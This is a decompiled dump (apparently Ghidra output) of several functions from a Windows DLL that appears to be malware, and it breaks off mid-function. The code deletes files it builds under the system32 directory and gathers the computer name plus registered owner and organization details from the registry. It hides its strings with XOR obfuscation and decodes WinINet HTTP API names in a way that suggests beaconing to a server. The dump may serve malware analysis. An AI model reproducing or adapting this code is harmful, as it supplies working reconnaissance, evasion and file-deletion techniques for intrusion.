#### FUNCTIONS ####


int __cdecl FUN_100099aa(HMODULE *param_1,int param_2)

{
  int *piVar1;
  HMODULE pHVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  
  iVar6 = 0;
  if (param_1 != (HMODULE *)0x0) {
    pHVar2 = param_1[2];
    if (pHVar2 == (HMODULE)0x4) {
      iVar4 = FUN_10009936(param_1);
      iVar3 = *(int *)(iVar4 + 0x94);
      iVar5 = iVar4;
      while( true ) {
        if (iVar3 == param_2) {
          return iVar5;
        }
        piVar1 = (int *)(iVar5 + 0x98);
        iVar5 = *piVar1 + -0x98;
        if (((iVar5 == 0) || (iVar5 == iVar4)) || (iVar6 = iVar6 + 1, 1000 < iVar6)) break;
        iVar3 = *(int *)(*piVar1 + -4);
      }
    }
    else {
      if (pHVar2 == (HMODULE)0x5) {
        pHVar2 = param_1[3];
        if (pHVar2 == (HMODULE)0x0) {
          iVar4 = FUN_10009936(param_1);
          iVar3 = *(int *)(iVar4 + 0x9c);
          iVar5 = iVar4;
          while( true ) {
            if (iVar3 == param_2) {
              return iVar5;
            }
            piVar1 = (int *)(iVar5 + 0xa0);
            iVar5 = *piVar1 + -0xa0;
            if (((iVar5 == 0) || (iVar5 == iVar4)) || (iVar6 = iVar6 + 1, 1000 < iVar6)) break;
            iVar3 = *(int *)(*piVar1 + -4);
          }
        }
        else {
          if (pHVar2 == (HMODULE)0x1) {
            iVar4 = FUN_10009936(param_1);
            iVar3 = *(int *)(iVar4 + 0x84);
            iVar5 = iVar4;
            while( true ) {
              if (iVar3 == param_2) {
                return iVar5;
              }
              piVar1 = (int *)(iVar5 + 0x88);
              iVar5 = *piVar1 + -0x88;
              if (((iVar5 == 0) || (iVar5 == iVar4)) || (iVar6 = iVar6 + 1, 1000 < iVar6)) break;
              iVar3 = *(int *)(*piVar1 + -4);
            }
          }
          else {
            if (pHVar2 == (HMODULE)0x2) {
              if (*(short *)(param_1 + 4) == 0) {
                iVar4 = FUN_10009936(param_1);
                iVar3 = *(int *)(iVar4 + 0x84);
                iVar5 = iVar4;
                while( true ) {
                  if (iVar3 == param_2) {
                    return iVar5;
                  }
                  piVar1 = (int *)(iVar5 + 0x88);
                  iVar5 = *piVar1 + -0x88;
                  if (((iVar5 == 0) || (iVar5 == iVar4)) || (iVar6 = iVar6 + 1, 1000 < iVar6))
                  break;
                  iVar3 = *(int *)(*piVar1 + -4);
                }
              }
              else {
                iVar5 = FUN_10009936(param_1);
                iVar3 = iVar5;
                if (iVar5 == 0) {
                  return 0;
                }
                do {
                  if (*(int *)(iVar3 + 0x94) == param_2) {
                    return iVar3;
                  }
                  iVar3 = *(int *)(iVar3 + 0x98) + -0x98;
                } while (((iVar3 != 0) && (iVar3 != iVar5)) && (iVar6 = iVar6 + 1, iVar6 < 0x3e9));
              }
            }
          }
        }
      }
      else {
        if (pHVar2 == (HMODULE)0x6) {
          iVar3 = FUN_10009936(param_1);
          iVar5 = 0;
          iVar6 = iVar3;
          if (iVar3 == 0) {
            return 0;
          }
          do {
            if (*(int *)(iVar6 + 0x9c) == param_2) {
              return iVar6;
            }
            iVar6 = *(int *)(iVar6 + 0xa0) + -0xa0;
          } while (((iVar6 != 0) && (iVar6 != iVar3)) && (iVar5 = iVar5 + 1, iVar5 < 0x3e9));
        }
      }
    }
  }
  return 0;
}






DWORD __cdecl FUN_100012f0(int param_1)

{
  DWORD DVar1;
  char *pcVar2;
  int iVar3;
  undefined *_Dst;
  undefined4 *puVar4;
  LPCSTR lpFileName;
  int iStack00000008;
  undefined uStack8;
  undefined2 uStack7;
  undefined uStack5;
  
  uStack8 = 0xfd;
  uStack7 = 0x12;
  uStack5 = 0x10;
  FUN_1000d330();
  iVar3 = 0x41;
  puVar4 = (undefined4 *)&stack0xfffffec5;
  while (iVar3 != 0) {
    iVar3 = iVar3 + -1;
    *puVar4 = 0;
    puVar4 = puVar4 + 1;
  }
  iVar3 = 0x41;
  puVar4 = (undefined4 *)&stack0xfffffcb5;
  while (iVar3 != 0) {
    iVar3 = iVar3 + -1;
    *puVar4 = 0;
    puVar4 = puVar4 + 1;
  }
  iVar3 = 0x40;
  puVar4 = (undefined4 *)&stack0xfffffdbf;
  while (iVar3 != 0) {
    iVar3 = iVar3 + -1;
    *puVar4 = 0;
    puVar4 = puVar4 + 1;
  }
  *(undefined2 *)puVar4 = 0;
  iVar3 = 0x4203;
  uStack8 = 0;
  uStack7 = 0;
  uStack5 = 0;
  puVar4 = (undefined4 *)&stack0xfffef4a5;
  while (iVar3 != 0) {
    iVar3 = iVar3 + -1;
    *puVar4 = 0;
    puVar4 = puVar4 + 1;
  }
  *(undefined2 *)puVar4 = 0;
  *(undefined *)((int)puVar4 + 2) = 0;
  if (param_1 == 0) {
    DVar1 = 0xffffffff;
  }
  else {
                    /* DWORD nSize for GetEnvironmentVariableA */
                    /* LPSTR lpBuffer for GetEnvironmentVariableA */
                    /* LPCSTR lpName for GetEnvironmentVariableA */
    DVar1 = GetEnvironmentVariableA(s_windir_10010020,&stack0xfffffec4,0x105);
    if (DVar1 == 0) {
      DVar1 = GetLastError();
    }
    else {
                    /* size_t _Size for memcpy */
                    /* void * _Src for memcpy */
                    /* void * _Dst for memcpy */
      memcpy(&stack0xffffffdc,(void *)(param_1 + 0x160),0x10);
                    /* size_t _Size for memcpy */
                    /* void * _Src for memcpy */
                    /* void * _Dst for memcpy */
      memcpy(&stack0xffffffec,(void *)(param_1 + 0x170),0x10);
                    /* size_t _Size for memcpy */
                    /* void * _Src for memcpy */
                    /* void * _Dst for memcpy */
      memcpy(&stack0xffffffcc,(void *)(param_1 + 0x150),0x10);
                    /* char * _Source for strcat */
                    /* char * _Dest for strcat */
      strcat(&stack0xfffffec4,s_\system32_10010014);
                    /* size_t _Count for strncpy */
                    /* char * _Source for strncpy */
                    /* char * _Dest for strncpy */
      strncpy(&stack0xfffffcb4,&stack0xfffffec4,0x104);
                    /* char * _Source for strcat */
                    /* char * _Dest for strcat */
      strcat(&stack0xfffffec4,&stack0xffffffec);
                    /* char * _Source for strcat */
                    /* char * _Dest for strcat */
      strcat(&stack0xfffffcb4,&stack0xffffffdc);
                    /* char * _SubStr for strstr */
                    /* char * _Str for strstr */
      pcVar2 = strstr(&stack0xfffffec4,&stack0xfffffff0);
      _Dst = &stack0xfffef4a4;
      iStack00000008 = 7;
      do {
                    /* size_t _Size for memcpy */
                    /* void * _Src for memcpy */
                    /* void * _Dst for memcpy */
        memcpy(_Dst,&stack0xfffffec4,0x104);
                    /* size_t _Size for memcpy */
                    /* void * _Src for memcpy */
                    /* void * _Dst for memcpy */
        memcpy(&stack0xfffffdbe,&stack0xffffffec,0x104);
        pcVar2[-1] = pcVar2[-1] + '\x01';
        _Dst = _Dst + 0x104;
        iStack00000008 = iStack00000008 + -1;
      } while (iStack00000008 != 0);
      lpFileName = &stack0xfffef4a4;
      iVar3 = 4;
      do {
                    /* LPCSTR lpFileName for DeleteFileA */
        DeleteFileA(lpFileName);
        lpFileName = lpFileName + 0x208;
        iVar3 = iVar3 + -1;
      } while (iVar3 != 0);
                    /* LPCSTR lpFileName for DeleteFileA */
      DeleteFileA(&stack0xfffffcb4);
      DVar1 = 0;
    }
  }
  return DVar1;
}




uint __cdecl FUN_100043d2(char **param_1,size_t *param_2,char *param_3)

{
  char *pcVar1;
  size_t sVar2;
  BOOL BVar3;
  int iVar4;
  LPCSTR lpString2;
  LSTATUS LVar5;
  BYTE *_Source;
  char *pcVar6;
  uint uVar7;
  undefined4 *in_FS_OFFSET;
  size_t local_320;
  size_t local_31c;
  size_t local_318;
  int local_314;
  int local_310;
  undefined4 local_30c;
  DWORD local_308;
  BYTE local_304 [264];
  DWORD local_1fc;
  CHAR local_1f8 [264];
  uint local_f0;
  CHAR local_ec [16];
  DWORD local_dc;
  char *local_d8;
  char *local_d4;
  char local_d0;
  undefined local_cf;
  undefined local_ce;
  undefined local_cd;
  undefined local_cc;
  undefined local_cb;
  undefined local_ca;
  undefined local_c9;
  undefined local_c8;
  undefined local_c7;
  undefined local_c6;
  char local_c4;
  undefined local_c3;
  undefined local_c2;
  undefined local_c1;
  undefined local_c0;
  undefined local_bf;
  undefined local_be;
  undefined local_bd;
  undefined local_bc;
  undefined local_bb;
  undefined local_ba;
  undefined local_b9;
  undefined local_b8;
  undefined local_b7;
  undefined local_b6;
  undefined local_b5;
  BYTE local_b4;
  undefined local_b3;
  undefined local_b2;
  char local_b0;
  undefined local_af;
  undefined local_ae;
  undefined local_ad;
  undefined local_ac;
  undefined local_ab;
  undefined local_aa;
  undefined local_a9;
  undefined local_a8;
  undefined local_a7;
  undefined local_a6;
  undefined local_a5;
  undefined local_a4;
  undefined local_a3;
  undefined local_a2;
  undefined local_a1;
  undefined local_a0;
  undefined local_9f;
  undefined local_9e;
  undefined local_9d;
  undefined local_9c;
  undefined local_9b;
  undefined local_9a;
  LPCSTR local_98;
  HKEY local_94;
  char *local_90;
  char local_8c;
  undefined local_8b;
  undefined local_8a;
  undefined local_89;
  undefined local_88;
  undefined local_87;
  undefined local_86;
  undefined local_85;
  undefined local_84;
  undefined local_83;
  undefined local_82;
  char local_80;
  undefined local_7f;
  undefined local_7e;
  undefined local_7d;
  undefined local_7c;
  undefined local_7b;
  undefined local_7a;
  undefined local_79;
  undefined local_78;
  undefined local_77;
  undefined local_76;
  undefined local_75;
  undefined local_74;
  undefined local_73;
  undefined local_72;
  undefined local_71;
  undefined local_70;
  undefined local_6f;
  undefined local_6e;
  undefined local_6d;
  undefined local_6c;
  undefined local_6b;
  undefined local_6a;
  undefined local_69;
  undefined local_68;
  undefined local_67;
  undefined local_66;
  undefined local_65;
  undefined local_64;
  undefined local_63;
  undefined local_62;
  undefined local_61;
  undefined local_60;
  undefined local_5f;
  undefined local_5e;
  undefined local_5d;
  undefined local_5c;
  undefined local_5b;
  undefined local_5a;
  undefined local_59;
  undefined local_58;
  undefined local_57;
  undefined local_56;
  undefined local_55;
  undefined local_54;
  undefined local_53;
  uint local_50;
  byte local_4c;
  char local_48;
  undefined local_47;
  undefined local_46;
  undefined local_45;
  undefined local_44;
  undefined local_43;
  undefined local_42;
  undefined local_41;
  undefined local_40;
  undefined local_3f;
  undefined local_3e;
  undefined local_3d;
  undefined local_3c;
  undefined local_3b;
  undefined local_3a;
  undefined local_39;
  undefined local_38;
  undefined local_37;
  undefined local_36;
  undefined local_35;
  undefined local_34;
  undefined local_33;
  undefined local_32;
  undefined local_31;
  undefined local_30;
  undefined local_2f;
  undefined local_2e;
  undefined local_2d;
  undefined local_2c;
  undefined local_2b;
  undefined local_2a;
  undefined local_29;
  undefined local_28;
  undefined local_27;
  undefined local_26;
  undefined local_25;
  undefined local_24;
  undefined local_23;
  undefined local_22;
  undefined local_21;
  undefined local_20;
  undefined local_1f;
  undefined local_1e;
  undefined *local_1c;
  undefined4 local_14;
  code *pcStack16;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &DAT_1000e360;
  pcStack16 = FUN_1000c600;
  local_14 = *in_FS_OFFSET;
  *in_FS_OFFSET = &local_14;
  local_1c = &stack0xfffffcd4;
  local_50 = 0x1000;
  local_4c = 0;
  local_94 = (HKEY)0x0;
  local_d8 = (char *)0x0;
  local_98 = (LPCSTR)0x0;
  local_90 = (char *)0x0;
  local_d4 = (char *)0x0;
  local_b4 = 'Z';
  local_b3 = 0x5a;
  local_b2 = 0;
  local_d0 = 'O';
  local_cf = 0x4e;
  local_ce = 0x4f;
  local_cd = 0x4f;
  local_cc = 0x4f;
  local_cb = 0x4f;
  local_ca = 0x4f;
  local_c9 = 0x4f;
  local_c8 = 0x5a;
  local_c7 = 0x5a;
  local_c6 = 0;
  local_8c = 'O';
  local_8b = 0x4f;
  local_8a = 0x4f;
  local_89 = 0x4f;
  local_88 = 0x4f;
  local_87 = 0x4f;
  local_86 = 0x4f;
  local_85 = 0x4f;
  local_84 = 0x5a;
  local_83 = 0x5a;
  local_82 = 0;
  local_80 = ',';
  local_7f = 0x30;
  local_7e = 0x39;
  local_7d = 0x2b;
  local_7c = 0x28;
  local_7b = 0x3e;
  local_7a = 0x2d;
  local_79 = 0x3a;
  local_78 = 0x23;
  local_77 = 0x32;
  local_76 = 0x16;
  local_75 = 0x1c;
  local_74 = 0xd;
  local_73 = 0x10;
  local_72 = 0xc;
  local_71 = 0x10;
  local_70 = 0x19;
  local_6f = 0xb;
  local_6e = 0x23;
  local_6d = 0x28;
  local_6c = 0x16;
  local_6b = 0x11;
  local_6a = 0x1b;
  local_69 = 0x10;
  local_68 = 8;
  local_67 = 0xc;
  local_66 = 0x5f;
  local_65 = 0x31;
  local_64 = 0x2b;
  local_63 = 0x23;
  local_62 = 0x3c;
  local_61 = 10;
  local_60 = 0xd;
  local_5f = 0xd;
  local_5e = 0x1a;
  local_5d = 0x11;
  local_5c = 0xb;
  local_5b = 0x29;
  local_5a = 0x1a;
  local_59 = 0xd;
  local_58 = 0xc;
  local_57 = 0x16;
  local_56 = 0x10;
  local_55 = 0x11;
  local_54 = 0x23;
  local_53 = 0;
  local_48 = ',';
  local_47 = 0x30;
  local_46 = 0x39;
  local_45 = 0x2b;
  local_44 = 0x28;
  local_43 = 0x3e;
  local_42 = 0x2d;
  local_41 = 0x3a;
  local_40 = 0x23;
  local_3f = 0x32;
  local_3e = 0x16;
  local_3d = 0x1c;
  local_3c = 0xd;
  local_3b = 0x10;
  local_3a = 0xc;
  local_39 = 0x10;
  local_38 = 0x19;
  local_37 = 0xb;
  local_36 = 0x23;
  local_35 = 0x28;
  local_34 = 0x16;
  local_33 = 0x11;
  local_32 = 0x1b;
  local_31 = 0x10;
  local_30 = 8;
  local_2f = 0xc;
  local_2e = 0x23;
  local_2d = 0x3c;
  local_2c = 10;
  local_2b = 0xd;
  local_2a = 0xd;
  local_29 = 0x1a;
  local_28 = 0x11;
  local_27 = 0xb;
  local_26 = 0x29;
  local_25 = 0x1a;
  local_24 = 0xd;
  local_23 = 0xc;
  local_22 = 0x16;
  local_21 = 0x10;
  local_20 = 0x11;
  local_1f = 0x23;
  local_1e = 0;
  local_c4 = '-';
  local_c3 = 0x1a;
  local_c2 = 0x18;
  local_c1 = 0x16;
  local_c0 = 0xc;
  local_bf = 0xb;
  local_be = 0x1a;
  local_bd = 0xd;
  local_bc = 0x1a;
  local_bb = 0x1b;
  local_ba = 0x30;
  local_b9 = 8;
  local_b8 = 0x11;
  local_b7 = 0x1a;
  local_b6 = 0xd;
  local_b5 = 0;
  local_b0 = '-';
  local_af = 0x1a;
  local_ae = 0x18;
  local_ad = 0x16;
  local_ac = 0xc;
  local_ab = 0xb;
  local_aa = 0x1a;
  local_a9 = 0xd;
  local_a8 = 0x1a;
  local_a7 = 0x1b;
  local_a6 = 0x30;
  local_a5 = 0xd;
  local_a4 = 0x18;
  local_a3 = 0x1e;
  local_a2 = 0x11;
  local_a1 = 0x16;
  local_a0 = 5;
  local_9f = 0x1e;
  local_9e = 0xb;
  local_9d = 0x16;
  local_9c = 0x10;
  local_9b = 0x11;
  local_9a = 0;
  local_8 = 1;
  FUN_100075ee((char *)&local_b4);
  FUN_100075ee(&local_d0);
  FUN_100075ee(&local_8c);
  FUN_100075ee(&local_80);
  FUN_100075ee(&local_48);
  FUN_100075ee(&local_c4);
  FUN_100075ee(&local_b0);
                    /* size_t _Size for malloc */
  pcVar1 = (char *)malloc(0x1001);
  local_d8 = pcVar1;
  if (pcVar1 != (char *)0x0) {
                    /* size_t _Size for memset */
                    /* int _Val for memset */
                    /* void * _Dst for memset */
    memset(pcVar1,0,0x1001);
                    /* size_t _Size for malloc */
    local_98 = (LPCSTR)malloc(0x1001);
    if (local_98 != (LPCSTR)0x0) {
                    /* size_t _Size for memset */
                    /* int _Val for memset */
                    /* void * _Dst for memset */
      memset(local_98,0,0x1001);
                    /* size_t _Size for malloc */
      local_90 = (char *)malloc(0x1001);
      if (local_90 != (char *)0x0) {
                    /* size_t _Size for memset */
                    /* int _Val for memset */
                    /* void * _Dst for memset */
        memset(local_90,0,0x1001);
                    /* size_t _Size for malloc */
        local_d4 = (char *)malloc(0x1001);
        if (local_d4 != (char *)0x0) {
                    /* size_t _Size for memset */
                    /* int _Val for memset */
                    /* void * _Dst for memset */
          memset(local_d4,0,0x1001);
                    /* size_t _Count for strncpy */
                    /* char * _Source for strncpy */
                    /* char * _Dest for strncpy */
          strncpy(pcVar1,param_3,0x1000);
                    /* char * _Str for strlen */
          sVar2 = strlen(pcVar1);
                    /* size_t _Count for strncat */
                    /* char * _Source for strncat */
                    /* char * _Dest for strncat */
          strncat(pcVar1,(char *)&local_b4,0x1000 - sVar2);
          BVar3 = FUN_10006cfb();
                    /* char * _Str for strlen */
          if (BVar3 == 0) {
            sVar2 = strlen(pcVar1);
            pcVar6 = &local_8c;
          }
          else {
            sVar2 = strlen(pcVar1);
                    /* char * _Str for strlen */
            pcVar6 = &local_d0;
          }
                    /* char * _Source for strncat */
                    /* char * _Dest for strncat */
          strncat(pcVar1,pcVar6,0x1000 - sVar2);
                    /* size_t _Size for memset */
                    /* int _Val for memset */
                    /* void * _Dst for memset */
          memset(local_ec,0,0x10);
          local_dc = 0xf;
                    /* LPDWORD nSize for GetComputerNameA */
                    /* LPSTR lpBuffer for GetComputerNameA */
          GetComputerNameA(local_ec,&local_dc);
                    /* char * _Str for strlen */
          sVar2 = strlen(pcVar1);
                    /* size_t _Count for strncat */
                    /* char * _Source for strncat */
                    /* char * _Dest for strncat */
          strncat(pcVar1,local_ec,0x1000 - sVar2);
                    /* char * _Str for strlen */
          sVar2 = strlen(pcVar1);
                    /* size_t _Count for strncat */
                    /* char * _Source for strncat */
                    /* char * _Dest for strncat */
          strncat(pcVar1,(char *)&local_b4,0x1000 - sVar2);
                    /* size_t _Size for memset */
                    /* int _Val for memset */
                    /* void * _Dst for memset */
          memset(local_1f8,0,0x105);
          iVar4 = FUN_10007578((DWORD *)0x0);
          local_f0 = (uint)(iVar4 == 2);
          lpString2 = &local_80;
          if (local_f0 != 1) {
            lpString2 = &local_48;
          }
                    /* LPCSTR lpString2 for lstrcpynA */
                    /* LPSTR lpString1 for lstrcpynA */
          lstrcpynA(local_1f8,lpString2,0x104);
                    /* PHKEY phkResult for RegOpenKeyExA */
                    /* REGSAM samDesired for RegOpenKeyExA */
                    /* DWORD ulOptions for RegOpenKeyExA */
                    /* LPCSTR lpSubKey for RegOpenKeyExA */
                    /* HKEY hKey for RegOpenKeyExA */
          LVar5 = RegOpenKeyExA((HKEY)0x80000002,local_1f8,0,0x20019,(PHKEY)&local_94);
          if (LVar5 == 0) {
                    /* size_t _Size for memset */
                    /* int _Val for memset */
                    /* void * _Dst for memset */
            memset(local_304,0,0x105);
            local_308 = 0x104;
            local_1fc = 0;
                    /* LPDWORD lpcbData for RegQueryValueExA */
                    /* LPBYTE lpData for RegQueryValueExA */
                    /* LPDWORD lpType for RegQueryValueExA */
                    /* LPDWORD lpReserved for RegQueryValueExA */
                    /* LPCSTR lpValueName for RegQueryValueExA */
                    /* HKEY hKey for RegQueryValueExA */
            RegQueryValueExA(local_94,&local_c4,(LPDWORD)0x0,&local_1fc,local_304,&local_308);
                    /* char * _Str for strlen */
            sVar2 = strlen(pcVar1);
                    /* size_t _Count for strncat */
                    /* char * _Source for strncat */
                    /* char * _Dest for strncat */
            strncat(pcVar1,(char *)local_304,0x1000 - sVar2);
                    /* char * _Str for strlen */
            sVar2 = strlen(pcVar1);
                    /* size_t _Count for strncat */
                    /* char * _Source for strncat */
                    /* char * _Dest for strncat */
            strncat(pcVar1,(char *)&local_b4,0x1000 - sVar2);
                    /* size_t _Size for memset */
                    /* int _Val for memset */
                    /* void * _Dst for memset */
            memset(local_304,0,0x105);
            local_308 = 0x104;
            local_1fc = 0;
                    /* LPDWORD lpcbData for RegQueryValueExA */
                    /* LPBYTE lpData for RegQueryValueExA */
                    /* LPDWORD lpType for RegQueryValueExA */
                    /* LPDWORD lpReserved for RegQueryValueExA */
                    /* LPCSTR lpValueName for RegQueryValueExA */
                    /* HKEY hKey for RegQueryValueExA */
            RegQueryValueExA(local_94,&local_b0,(LPDWORD)0x0,&local_1fc,local_304,&local_308);
                    /* char * _Str for strlen */
            sVar2 = strlen(pcVar1);
            _Source = local_304;
          }
          else {
                    /* char * _Str for strlen */
            sVar2 = strlen(pcVar1);
            _Source = &local_b4;
          }
                    /* char * _Source for strncat */
                    /* char * _Dest for strncat */
          strncat(pcVar1,(char *)_Source,0x1000 - sVar2);
                    /* char * _Str for strlen */
          sVar2 = strlen(pcVar1);
                    /* size_t _Count for strncat */
                    /* char * _Source for strncat */
                    /* char * _Dest for strncat */
          strncat(pcVar1,(char *)&local_b4,0x1000 - sVar2);
                    /* size_t _Size for memset */
                    /* int _Val for memset */
                    /* void * _Dst for memset */
          memset(local_d4,0,0x1001);
          FUN_10004d5c(local_d4,0x1000);
                    /* char * _Str for strlen */
          local_318 = strlen(local_d4);
                    /* char * _Str for strlen */
          sVar2 = strlen(pcVar1);
          pcVar1 = local_d8;
          if (0x1000 < local_318 + sVar2) {
            local_50 = 0x2000;
                    /* size_t _NewSize for realloc */
                    /* void * _Memory for realloc */
            pcVar1 = (char *)realloc(local_d8,0x2001);
            local_d8 = pcVar1;
            if (pcVar1 == (char *)0x0) goto LAB_10004cac;
            local_30c = 0x1001;
                    /* size_t _Size for memset */
                    /* int _Val for memset */
                    /* void * _Dst for memset */
            memset(pcVar1 + 0x1001,0,0x1000);
          }
                    /* char * _Str for strlen */
          sVar2 = strlen(pcVar1);
                    /* size_t _Count for strncat */
                    /* char * _Source for strncat */
                    /* char * _Dest for strncat */
          strncat(pcVar1,local_d4,local_50 - sVar2);
                    /* size_t _Size for memset */
                    /* int _Val for memset */
                    /* void * _Dst for memset */
          memset(local_90,0,0x1001);
          FUN_10006551(local_90);
                    /* char * _Str for strlen */
          local_31c = strlen(local_90);
                    /* char * _Str for strlen */
          sVar2 = strlen(pcVar1);
          pcVar1 = local_d8;
          if (local_50 < local_31c + sVar2) {
            sVar2 = local_50 + 0x1001;
            local_50 = local_50 + 0x1000;
                    /* size_t _NewSize for realloc */
                    /* void * _Memory for realloc */
            pcVar1 = (char *)realloc(local_d8,sVar2);
            local_d8 = pcVar1;
            if (pcVar1 == (char *)0x0) goto LAB_10004cac;
            local_310 = local_50 - 0xfff;
                    /* size_t _Size for memset */
                    /* int _Val for memset */
                    /* void * _Dst for memset */
            memset(pcVar1 + local_310,0,0x1000);
          }
                    /* char * _Str for strlen */
          sVar2 = strlen(pcVar1);
                    /* size_t _Count for strncat */
                    /* char * _Source for strncat */
                    /* char * _Dest for strncat */
          strncat(pcVar1,local_90,local_50 - sVar2);
                    /* size_t _Size for memset */
                    /* int _Val for memset */
                    /* void * _Dst for memset */
          memset(local_98,0,0x1001);
          FUN_100060e6(local_98,0x1000);
                    /* char * _Str for strlen */
          local_320 = strlen(local_98);
                    /* char * _Str for strlen */
          sVar2 = strlen(pcVar1);
          pcVar1 = local_d8;
          if (local_50 < local_320 + sVar2) {
            sVar2 = local_50 + 0x1001;
            local_50 = local_50 + 0x1000;
                    /* size_t _NewSize for realloc */
                    /* void * _Memory for realloc */
            pcVar1 = (char *)realloc(local_d8,sVar2);
            local_d8 = pcVar1;
            if (pcVar1 == (char *)0x0) goto LAB_10004cac;
            local_314 = local_50 - 0xfff;
                    /* size_t _Size for memset */
                    /* int _Val for memset */
                    /* void * _Dst for memset */
            memset(pcVar1 + local_314,0,0x1000);
          }
                    /* char * _Str for strlen */
          sVar2 = strlen(pcVar1);
                    /* size_t _Count for strncat */
                    /* char * _Source for strncat */
                    /* char * _Dest for strncat */
          strncat(pcVar1,local_98,local_50 - sVar2);
                    /* char * _Str for strlen */
          sVar2 = strlen(pcVar1);
          *param_2 = sVar2;
                    /* size_t _Size for malloc */
          pcVar6 = (char *)malloc(sVar2 + 1);
          *param_1 = pcVar6;
          if (pcVar6 != (char *)0x0) {
                    /* size_t _Size for memset */
                    /* int _Val for memset */
                    /* void * _Dst for memset */
            memset(pcVar6,0,*param_2 + 1);
                    /* size_t _Count for strncpy */
                    /* char * _Source for strncpy */
                    /* char * _Dest for strncpy */
            strncpy(*param_1,pcVar1,*param_2);
            local_4c = 1;
          }
        }
      }
    }
  }
LAB_10004cac:
  local_8 = 0;
  uVar7 = FUN_10004cc1();
  *in_FS_OFFSET = local_14;
  return uVar7 & 0xffffff00 | (uint)local_4c;
}









=======================================================
FUN_Z.C
=======================================================


/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined4 FUN_10002f79(void)

{
  int iVar1;
  undefined4 *in_FS_OFFSET;
  char local_c4;
  undefined local_c3;
  undefined local_c2;
  undefined local_c1;
  undefined local_c0;
  undefined local_bf;
  undefined local_be;
  undefined local_bd;
  undefined local_bc;
  undefined local_bb;
  undefined local_ba;
  undefined local_b9;
  undefined local_b8;
  undefined local_b7;
  undefined local_b6;
  undefined local_b5;
  undefined local_b4;
  char local_b0;
  undefined local_af;
  undefined local_ae;
  undefined local_ad;
  undefined local_ac;
  undefined local_ab;
  undefined local_aa;
  undefined local_a9;
  undefined local_a8;
  undefined local_a7;
  undefined local_a6;
  undefined local_a5;
  undefined local_a4;
  undefined local_a3;
  undefined local_a2;
  undefined local_a1;
  undefined local_a0;
  char local_9c;
  undefined local_9b;
  undefined local_9a;
  undefined local_99;
  undefined local_98;
  undefined local_97;
  undefined local_96;
  undefined local_95;
  undefined local_94;
  undefined local_93;
  undefined local_92;
  undefined local_91;
  undefined local_90;
  undefined local_8f;
  undefined local_8e;
  undefined local_8d;
  undefined local_8c;
  char local_88;
  undefined local_87;
  undefined local_86;
  undefined local_85;
  undefined local_84;
  undefined local_83;
  undefined local_82;
  undefined local_81;
  undefined local_80;
  undefined local_7f;
  undefined local_7e;
  undefined local_7d;
  char local_7c;
  undefined local_7b;
  undefined local_7a;
  undefined local_79;
  undefined local_78;
  undefined local_77;
  undefined local_76;
  undefined local_75;
  undefined local_74;
  undefined local_73;
  undefined local_72;
  undefined local_71;
  undefined local_70;
  undefined local_6f;
  undefined local_6e;
  undefined local_6d;
  undefined local_6c;
  undefined local_6b;
  undefined local_6a;
  undefined local_69;
  char local_68;
  undefined local_67;
  undefined local_66;
  undefined local_65;
  undefined local_64;
  undefined local_63;
  undefined local_62;
  undefined local_61;
  undefined local_60;
  undefined local_5f;
  undefined local_5e;
  undefined local_5d;
  undefined local_5c;
  undefined local_5b;
  undefined local_5a;
  undefined local_59;
  undefined local_58;
  char local_54;
  undefined local_53;
  undefined local_52;
  undefined local_51;
  undefined local_50;
  undefined local_4f;
  undefined local_4e;
  undefined local_4d;
  undefined local_4c;
  undefined local_4b;
  undefined local_4a;
  undefined local_49;
  undefined local_48;
  undefined local_47;
  undefined local_46;
  undefined local_45;
  undefined local_44;
  undefined local_43;
  undefined local_42;
  char local_40;
  undefined local_3f;
  undefined local_3e;
  undefined local_3d;
  undefined local_3c;
  undefined local_3b;
  undefined local_3a;
  undefined local_39;
  undefined local_38;
  undefined local_37;
  undefined local_36;
  undefined local_35;
  undefined local_34;
  undefined local_33;
  char local_30;
  undefined local_2f;
  undefined local_2e;
  undefined local_2d;
  undefined local_2c;
  undefined local_2b;
  undefined local_2a;
  undefined local_29;
  undefined local_28;
  undefined local_27;
  undefined local_26;
  undefined local_25;
  undefined local_24;
  undefined local_23;
  undefined local_22;
  undefined4 local_20;
  undefined *local_1c;
  undefined4 local_14;
  code *pcStack16;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &DAT_1000e268;
  pcStack16 = FUN_1000c600;
  local_14 = *in_FS_OFFSET;
  *in_FS_OFFSET = &local_14;
  local_1c = &stack0xffffff30;
  local_20 = 1;
  local_88 = '\b';
  local_87 = 0x16;
  local_86 = 0x11;
  local_85 = 0x16;
  local_84 = 0x11;
  local_83 = 0x1a;
  local_82 = 0xb;
  local_81 = 0x51;
  local_80 = 0x1b;
  local_7f = 0x13;
  local_7e = 0x13;
  local_7d = 0;
  local_c4 = '6';
  local_c3 = 0x11;
  local_c2 = 0xb;
  local_c1 = 0x1a;
  local_c0 = 0xd;
  local_bf = 0x11;
  local_be = 0x1a;
  local_bd = 0xb;
  local_bc = 0x3c;
  local_bb = 0x10;
  local_ba = 0x11;
  local_b9 = 0x11;
  local_b8 = 0x1a;
  local_b7 = 0x1c;
  local_b6 = 0xb;
  local_b5 = 0x3e;
  local_b4 = 0;
  local_40 = '6';
  local_3f = 0x11;
  local_3e = 0xb;
  local_3d = 0x1a;
  local_3c = 0xd;
  local_3b = 0x11;
  local_3a = 0x1a;
  local_39 = 0xb;
  local_38 = 0x30;
  local_37 = 0xf;
  local_36 = 0x1a;
  local_35 = 0x11;
  local_34 = 0x3e;
  local_33 = 0;
  local_b0 = '7';
  local_af = 0xb;
  local_ae = 0xb;
  local_ad = 0xf;
  local_ac = 0x30;
  local_ab = 0xf;
  local_aa = 0x1a;
  local_a9 = 0x11;
  local_a8 = 0x2d;
  local_a7 = 0x1a;
  local_a6 = 0xe;
  local_a5 = 10;
  local_a4 = 0x1a;
  local_a3 = 0xc;
  local_a2 = 0xb;
  local_a1 = 0x3e;
  local_a0 = 0;
  local_68 = '7';
  local_67 = 0xb;
  local_66 = 0xb;
  local_65 = 0xf;
  local_64 = 0x2c;
  local_63 = 0x1a;
  local_62 = 0x11;
  local_61 = 0x1b;
  local_60 = 0x2d;
  local_5f = 0x1a;
  local_5e = 0xe;
  local_5d = 10;
  local_5c = 0x1a;
  local_5b = 0xc;
  local_5a = 0xb;
  local_59 = 0x3e;
  local_58 = 0;
  local_30 = '7';
  local_2f = 0xb;
  local_2e = 0xb;
  local_2d = 0xf;
  local_2c = 0x2e;
  local_2b = 10;
  local_2a = 0x1a;
